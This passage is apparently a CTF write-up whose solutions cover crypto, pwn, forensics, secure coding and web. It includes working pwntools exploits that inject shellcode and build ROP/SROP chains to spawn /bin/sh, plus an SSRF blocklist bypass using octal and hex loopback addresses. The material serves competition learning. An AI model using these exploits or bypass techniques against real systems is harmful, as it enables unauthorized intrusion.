# Brute-force search for the shared secret S
found_flag = False
for i in range(w):
    S = pow(g, i * (p - 1) // w, p)
    key = hashlib.md5(long_to_bytes(S)).digest()
    cipher = AES.new(key, AES.MODE_ECB)

    try:
        decrypted = cipher.decrypt(ciphertext)
        # Check if 'flag' keyword is in the decrypted message
        if b"flag" in decrypted:
            print(decrypted.decode(errors='ignore'))
            found_flag = True
            break
    except Exception as e:
        continue

if not found_flag:
    print("Failed to find the flag.")
conn.close()
```

#### Smithy `Hard` `500 pts`
Initially we are given a prime $q$ of 1024 bits.
We can interact with the server with two options: 
1) For getting a prime $p$ - 512 bits, and a value $f = (sec+p)^{-1} \bmod q - k$ , where $sec$ and $k$ are unknowns.
2) For guessing the secret value ($sec$ in our context).

Only 3 interactions are allowed, one of them is used to guess the secret value which gives us the flag when guessed correctly. 

Looking at the equation and the challenge name `smithy` instantly hints us on the use of coppersmith to recover the secret!

We can get two equations:

$$f_0 = (sec+p_0)^{-1} \bmod q - k_0$$<br>
$$f_1 = (sec+p_1)^{-1} \bmod q - k_1$$<br>
this can be written mod q as two polynomials of the form:<br>
$$g_0 = (sec + p_0) * (f_0 + k_0) - 1$$<br>
$$g_1 = (sec + p_1) * (f_1 + k_1) - 1$$<br>
These two polynomials can be written as a nice single polynomial eliminating some unknowns by taking [resultant](https://en.wikipedia.org/wiki/Resultant) of them. Hence its also called as eliminant:

```python
P = PolynomialRing(GF(q), 3, 'x, y, z')
x, k0, k1 = P.gens()
g0 = (x + p0) * (f0 + k0) - 1
g1 = (x + p1) * (f1 + k1) - 1

g = g0.sylvester_matrix(g1, x).det()
```

Now we can perform coppersmith to recover `k0` and `k1`. Then its easy to recover the secret further!

```python
"""
The Coppersmith used here is a implementation from kiona
source: https://github.com/kionactf/coppersmith/
"""
from coppersmith_multivariate_heuristic import *

from sage.all import *
from pwn import process

io = process(["python", "chall.py"])
io.recvline()

q = int(io.recvline().decode().strip().split()[-1])
print(f'{q = }')
target = int(io.recvline().decode().strip().split()[-1])

io.sendlineafter(b'2): ', b'1')
p0 = int(io.recvline().decode().strip().split()[-1])
f0 = int(io.recvline().decode().strip().split()[-1])

io.sendlineafter(b'2): ', b'1')
p1 = int(io.recvline().decode().strip().split()[-1])
f1 = int(io.recvline().decode().strip().split()[-1])

P = PolynomialRing(GF(q), 3, 'x, y, z')
x, k0, k1 = P.gens()
g0 = (x + p0) * (f0 + k0) - 1
g1 = (x + p1) * (f1 + k1) - 1

g = g0.sylvester_matrix(g1, x).det()
print(f'{g = }')
# print(g.monomials(), g.coefficients())
# exit()
Pq = PolynomialRing(Zmod(q), 2, 'x, y')

x, y = Pq.gens()
g = vector(Pq, [x * y, x, y, 1]) * vector(Pq, g.coefficients())
sol = coppersmith_multivariate_heuristic(g, [2 ** 250, 2 ** 250], beta = 1.0)
print(f'{sol = }')
g0 = g0.subs({k0: sol[0][0]}).univariate_polynomial()
roots = g0.roots()
print(f'{roots = }')
sec = roots[0][0]
io.sendlineafter(b'2): ', b'2')
io.sendline(str(sec).encode())
io.interactive()
```

## Pwn:
#### Notepad-- `Easy` `100 pts`
In this challenge, I read the code and found that whatever we write in the notes is stored in some pre allocated space in the program's memory (not dynamically using the heap) and that whenever we call the get premium we get it's address printed which is very useful since memory addresses are randomized by aslr so that's one thing less to worry about.

And the best thing about the premium function is that it changes the memory region containing your notes to an executable memory region, allowing your processor to basically read memory stored there as an opcode.

So what I did was I just grabbed a shellcode (which is basically a sequence of opcodes that pop a shell) and stored it in the notes, then used the premium functionality to get the address leak and turn my stored shellcode into executable memory.

Finally, I found that when you ask to exit the program, it asks for a "final message" which is badly stored in memory and allows us to overflow main's return address by 7 bytes which is enough for us to jump to our leaked memory address.

So basically: store shellcode -> make it executable -> overwrite main return address to jump to our shellcode:
```python
#!/usr/bin/env python3
from pwn import *
context.log_level = 'error'
context.binary = elf = ELF('./chall')
context.terminal = ['alacritty', '-e']

if args.REMOTE:
    io = remote("13.234.240.113", 31013)
else:
    io = gdb.debug(elf.path, gdbscript=gs) if args.GDB else process()

def exploit():
    context.log_level = 'info'
    shellcode = asm(shellcraft.amd64.linux.sh())

    io.sendlineafter(b'>> ', b'1')
    io.sendline(shellcode) # store the shellcode

    # premium states gives us program address leak and turns our note into executable memory
    io.sendlineafter(b'>> ', b'3')
    io.recvuntil(b': ')
    elf.address = int(io.recvline(), 16) - elf.sym.notes

    # now we leave and overflow main's return address to jump to our now executable note containing our shellcode
    io.sendlineafter(b'>> ', b'4')
    io.sendlineafter(b': ', b'A'*40 + pack(elf.sym.notes))
    io.recv() # pass bye message
    io.interactive(prompt="shell> ")

if __name__ == "__main__":
    exploit()
```

#### Suscall Paradise `Medium` `300 pts`
Initial analysis:
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 v3; // rax
  void *v4; // rsp
  _BYTE v6[4]; // [rsp+8h] [rbp-10h] BYREF
  unsigned int v7; // [rsp+Ch] [rbp-Ch] BYREF
  void *buf; // [rsp+10h] [rbp-8h]

  init(argc, argv, envp);
  printf("How long will your input be? ");
  __isoc99_scanf("%d", &v7);
  if ( v7 <= 0x78 )
  {
    puts("Invalid input length.");
    exit(1);
  }
  v3 = 16 * (((int)v7 + 23LL) / 0x10uLL);
  while ( v6 != &v6[-(v3 & 0xFFFFFFFFFFFFF000LL)] )
    ;
  v4 = alloca(v3 & 0xFFF);
  if ( (v3 & 0xFFF) != 0 )
    *(_QWORD *)&v6[(v3 & 0xFFF) - 8] = *(_QWORD *)&v6[(v3 & 0xFFF) - 8];
  buf = v6;
  puts("Please enter your text:");
  read(0, buf, 0x78uLL);
  puts("Thanks for your input. Take care!");
  return 0;
}
```
The code first reads an integer input and ensures it is not less than `0x78`. However, the check is unsigned, meaning that if a negative number is provided, it will still pass the check.

Next, during the `alloca` calculation, the input is interpreted as a signed integer. If a negative number is input, it effectively reduces the stack allocation, creating an opportunity for a buffer overflow.

With the resulting buffer overflow and the absence of PIE, we have access to these gadgets that were clearly intended to be utilized by the author:
```
.text:00000000004011E1 deregister_tm_clone endp ; sp-analysis failed
.text:00000000004011E1
.text:00000000004011E2 ; ---------------------------------------------------------------------------
.text:00000000004011E2                 pop     rdx
.text:00000000004011E3                 retn
.text:00000000004011E4 ; ---------------------------------------------------------------------------
.text:00000000004011E4                 pop     rsi
.text:00000000004011E5                 retn
.text:00000000004011E6 ; ---------------------------------------------------------------------------
.text:00000000004011E6                 pop     rax
.text:00000000004011E7                 retn
.text:00000000004011E8 ; ---------------------------------------------------------------------------
.text:00000000004011E8                 syscall                 ; LINUX -
.text:00000000004011EA                 nop
.text:00000000004011EB                 pop     rbp
.text:00000000004011EC                 retn
.text:00000000004011EC ; } // starts at 4011D6
.text:00000000004011ED
```

We notice that there is no `pop rdi` gadget, meaning we can't directly use `execve` since we cannot specify the filename. However, using the available gadgets, we can jump back to the `read` call with a different address to write into, enabling us to set up a second-stage attack to prepare for SROP.

With SROP, we can fully control the program's context. This allows us to configure everything necessary for an `execve` syscall, set the instruction pointer (`rip`) to the syscall instruction, and win.

Here is the script for this exploit:
```python
from pwn import *

context.binary = elf = ELF('./chall', checksec=False)
context.log_level = "DEBUG"
context.terminal = "cmd.exe /c start wsl".split()

# p = elf.process()#; gdb.attach(p, "b*0x40137D\nc")
p = remote("", )

p.sendlineafter(b"be? ", b"-1")

POP_RAX = 0x4011E6
POP_RSI = 0x4011E4
POP_RDX = 0x4011E2
SYSCALL = 0x4011E8

STAGE2_ADDR = elf.bss(0xa00)

stage1 = flat([
    POP_RAX,
    STAGE2_ADDR + 0x40,
    POP_RDX,
    0x300,
    0x401361
])

p.sendlineafter(b"text:\n", b"A"*0x20 + p64(STAGE2_ADDR + 0x40) + stage1)

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = STAGE2_ADDR + 0x40
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = SYSCALL
frame.rsp = 0xdeadbeef

stage2 = b"/bin/sh\0" + flat([
    POP_RAX,
    0xf,
    SYSCALL
]) + bytes(frame)

p.sendlineafter(b"care!\n", stage2)
p.interactive()
```

## DigitalForensics:
#### Fixme `Easy` `100 pts`
This challenge was quite straightforward. From the challenge name itself, it was clear that the task involved fixing an image. I opened the provided image file in a hex editor and noticed that the PNG headers were altered (alternatively exchanged).

My first step was to search online for the correct PNG headers. I referred to [Wikipedia's list of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) and updated the headers accordingly. However, this alone didn’t solve the problem, so I realized there was more to fix.

To identify the issue, I opened a valid PNG file in the hex editor for comparison. Upon analyzing, I noticed a few additional bytes that needed correction. After updating all discrepancies, I opened the image file again, and this time, it worked perfectly, revealing the flag.

#### Clip it, Stash it `Medium` `300 pts`
I opened the memory file in FTK Imager. I could see a bunch of files and spent a good amount of time looking at the documents, downloads etc. but did not find anything useful other than rabbit holes.

Then I focused on the challenge name and description, I had to look for the clipboard contents. Upon a lot of research, I found out that I need to analyze `ActivitiesCache.db` which contains clipboard log along with a lot of other artifacts. It is located in `%AppData%\Local\ConnectedDevicesPlatform\<UserProfile>\`.

So I got this database, opened it in online sqlite viewer: https://inloop.github.io/sqlite-viewer/
We can see the clipboard content in the `ClipboardPayload` column in the `SmartLookup` table. The `ClipboardPayload` column contains base64 encoded string of the clipboard content.
<br><img src='Pasted image 20250115164321.png'>
Upon downloading these payloads, one of them had this: `[{"content":"Wm14aFozdDBjalJqTXpWZmRHZzBkRjkwTVcwelgyTTBibTR3ZEY5b01HeGtmUT09DQ==","formatName":"Text"}]`
Decoding from base64, gave us the flag: `flag{tr4c35_th4t_t1m3_c4nn0t_h0ld}`

## SecureCoding:
#### Secure API `Medium` `300 pts`
This challenge took a big chunk of my time, mostly because I found it a little guessy. The instructions were not very clear, and I think I am lucky that I managed to solved it.

We were given `app.py` implementing a tasks app API, and had to fix the all the problems in it, "without changing the core functionality" and that was the problem, it wasn't mentioned what exactly we could or could not change (and even getting a different error message caused problems), but anyhow, I managed to make it work by making these changes:

1. The JWT authorization token wasn't being verified properly, so even expired tokens could work for in the API.
Original Code:
```python
def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization')
        if not token:
            return jsonify({'message': 'Token is missing!'}), 401
        try:
            data = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
            current_user = next((u for u in users if u['id'] == data['userId']), None)
        except Exception as e:
            return jsonify({'message': f'Token is invalid: {str(e)}'}), 401
        return f(current_user, *args, **kwargs)
    return decorated
```
Modified Code:
```python
def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization')
        if not token:
            return jsonify({'message': 'Token is missing!'}), 401
        try:
            data = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
            current_user = next((u for u in users if u['id'] == data['userId']), None)
            if 'exp' in data:
                expiration = datetime.datetime.utcfromtimestamp(data.get('exp'))
                if datetime.datetime.utcnow() > expiration:
                    raise Exception("Token is expired!")
            else:
                raise Exception("Token is invalid!")
        except Exception as e:
            return jsonify({'message': f'Token is invalid: {str(e)}'}), 401
        return f(current_user, *args, **kwargs)
    return decorated
```

2. Applied proper input parametrization everywhere, by replacing direct use of user provided input using with the `get` parameter. Example: `auth['username']` replaced with `username = auth.get('username')` then using `username`.

3. All tasks were visible to every user, so anyone can read tasks of someone else. This should only be possible for the admin users.
Original Code:
```python
@app.route('/tasks', methods=['GET'])
@token_required
def get_tasks(current_user):
    return jsonify(tasks)
```
Modified Code:
```python
@app.route('/tasks', methods=['GET'])
@token_required
def get_tasks(current_user):
    if current_user['role'] == 'admin':
        return jsonify(tasks)
    else:
        return jsonify([t for t in tasks if t['userId'] == current_user['id']])
```

4. Anyone could update tasks of other people, they should be allowed to update only their tasks, while admins should be allowed to update any task.
Original Code:
```python
@app.route('/tasks/<int:task_id>', methods=['PUT'])
@token_required
def update_task(task_id):
    task = next((t for t in tasks if t['id'] == task_id), None)
    if not task:
        return jsonify({'message': 'Task not found'}), 404

    data = request.json
    task.update({'title': data['title'], 'description': data['description']})
    return jsonify(task), 201
```
Modified Code:
```python
@app.route('/tasks/<int:task_id>', methods=['PUT'])
@token_required
def update_task(current_user, task_id):
    task = next((t for t in tasks if t['id'] == task_id and (t['userId'] == current_user['id'] or current_user['role'] == 'admin')), None)
    if not task:
        return jsonify({'message': 'Task not found'}), 404

    data = request.json
    title = data.get('title')
    description = data.get('description')
    task.update({'title': title, 'description': description})
    return jsonify(task), 201
```

5. Anyone could delete tasks of other people, they should be allowed to delete only their tasks, while admins should be allowed to delete any task.
Original Code:
```python
@app.route('/tasks/<int:task_id>', methods=['DELETE'])
@token_required
def delete_task(current_user, task_id):
    task = next((t for t in tasks if t['id'] == task_id), None)
    if not task:
        return jsonify({'message': 'Task not found'}), 404

    tasks.remove(task)
    return jsonify({'message': 'Task deleted'}), 204
```
Modified Code:
```python
@app.route('/tasks/<int:task_id>', methods=['DELETE'])
@token_required
def delete_task(current_user, task_id):
    task = next((t for t in tasks if t['id'] == task_id and (t['userId'] == current_user['id'] or current_user['role'] == 'admin')), None)
    if not task:
        return jsonify({'message': 'Task not found'}), 404

    tasks.remove(task)
    return jsonify({'message': 'Task deleted'}), 204
```

6. This last part actually took hours of my time. The JWT secret was just `secretkey`, and it was manually stored in the code. I thought maybe we have to use some environment variables to make it secure, and I didn't consider that we just had to change its value. So after hours of thinking, I changed it to `secretkey1234erythough` and finally solved the challenge.

Full Code:
```python
from flask import Flask, request, jsonify
import jwt
import datetime
from functools import wraps

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secretkey1234erythough'

############################### DO NOT MODIFY ###############################

tasks = [
    {'id': 1, 'title': 'Task 1', 'description': 'Description 1', 'userId': 1},
    {'id': 2, 'title': 'Task 2', 'description': 'Description 2', 'userId': 2},
    {'id': 3, 'title': 'Task 3', 'description': 'Description 3', 'userId': 3}
]
users = [
    {'id': 1, 'username': 'admin', 'password': 'adminpass', 'role': 'admin'},
    {'id': 2, 'username': 'user1', 'password': 'userpass', 'role': 'user'},
    {'id': 3, 'username': 'user2', 'password': 'user2pass', 'role': 'user'},
]

############################### DO NOT MODIFY ###############################

def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization')
        if not token:
            return jsonify({'message': 'Token is missing!'}), 401
        try:
            data = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
            current_user = next((u for u in users if u['id'] == data['userId']), None)
            if 'exp' in data:
                expiration = datetime.datetime.utcfromtimestamp(data.get('exp'))
                if datetime.datetime.utcnow() > expiration:
                    raise Exception("Token is expired!")
            else:
                raise Exception("Token is invalid!")
        except Exception as e:
            return jsonify({'message': f'Token is invalid: {str(e)}'}), 401
        return f(current_user, *args, **kwargs)
    return decorated

@app.route('/login', methods=['POST'])
def login():
    auth = request.json
    if not auth or not auth.get('username') or not auth.get('password'):
        return jsonify({'message': 'Could not verify'}), 401

    username = auth.get('username')
    password = auth.get('password')
    user = next((u for u in users if u['username'] == username and u['password'] == password), None)
    if not user:
        return jsonify({'message': 'Invalid credentials'}), 401

    token = jwt.encode({
        'userId': user['id'],
        'exp': datetime.datetime.utcnow() + datetime.timedelta(minutes=30)
    }, app.config['SECRET_KEY'], algorithm='HS256')

    return jsonify({'token': token})

@app.route('/tasks', methods=['GET'])
@token_required
def get_tasks(current_user):
    if current_user['role'] == 'admin':
        return jsonify(tasks)
    else:
        return jsonify([t for t in tasks if t['userId'] == current_user['id']])

@app.route('/tasks', methods=['POST'])
@token_required
def create_task(current_user):
    data = request.json
    title = data.get('title')
    description = data.get('description')

    new_task = {
        'id': len(tasks) + 1,
        'title': title,
        'description': description,
        'userId': current_user['id']
    }
    tasks.append(new_task)
    return jsonify(new_task), 201

@app.route('/tasks/<int:task_id>', methods=['PUT'])
@token_required
def update_task(current_user, task_id):
    task = next((t for t in tasks if t['id'] == task_id and (t['userId'] == current_user['id'] or current_user['role'] == 'admin')), None)
    if not task:
        return jsonify({'message': 'Task not found'}), 404

    data = request.json
    title = data.get('title')
    description = data.get('description')
    task.update({'title': title, 'description': description})
    return jsonify(task), 201

@app.route('/tasks/<int:task_id>', methods=['DELETE'])
@token_required
def delete_task(current_user, task_id):
    task = next((t for t in tasks if t['id'] == task_id and (t['userId'] == current_user['id'] or current_user['role'] == 'admin')), None)
    if not task:
        return jsonify({'message': 'Task not found'}), 404

    tasks.remove(task)
    return jsonify({'message': 'Task deleted'}), 204

if __name__ == '__main__':
    app.run(debug=False)
```
## Web:
#### Snap From URL `Easy` `100 pts`
Analyzing the source files, we have to access the admin.html page which has the flag, via admin.py. So we have to access the admin page running on localhost:80. We can't access it directly, but we can use the Snap service provided to us, i.e. by performing SSRF. For this we need to access localhost.

The server has blacklisted several IPs and patterns to prevent us from accessing this:
<br><img src='Pasted image 20250115160147.png'>
<br><img src='Pasted image 20250115160201.png'>
Now, `127.0.0.1` is directly blacklisted, so we could have tried `127.0.0.2` or `127.0.0.3`, but these will get blocked too as the first regex pattern blocks out everything starting with 127.

However, we can easily bypass this by using any other representation of 127.0.0.3, like Octal or Hexadecimal:
```
Hexadeciaml = http://0x7F000003/ (For 127.0.0.3)
Octal = http://0177.0.0.03/ (For 127.0.0.3)
```
Both of these URLs pass the check, and we access the admin page!
Then we can find the flag in the source code of the page that opens.
# Key Learnings
Like every other CTF, this one was also packed with valuable lessons for me:
1. **Make sure to get enough sleep.** If I had rested well the night before the CTF, I might not have been so exhausted when it began! These small details might seem insignificant at first, but they can turn into major challenges when the moment arrives.

2. **Don't overcomplicate things.** The solution to the difficult forensics challenge was much easier than I initially believed. I already had all the necessary files, but I kept searching for more because I lacked confidence in myself.

3. **Take breaks.** A fresh perspective after a short break can make a big difference when you're stuck on a challenge.

# Feedback
The CTF was an excellent experience. The challenges were tough, skill-based, and largely free from guesswork, which was the best part! The organization was good, and the infrastructure performed without any issues throughout the event.

One suggestion I have is to display the scoreboard publicly during the CTF. This would give participants a clear sense of their standing and serve as a source of motivation for us to push harder when needed. Strategic thinking plays a crucial role in any competitive event, and having visibility of the scoreboard would enhance the competitive spirit and overall experience.
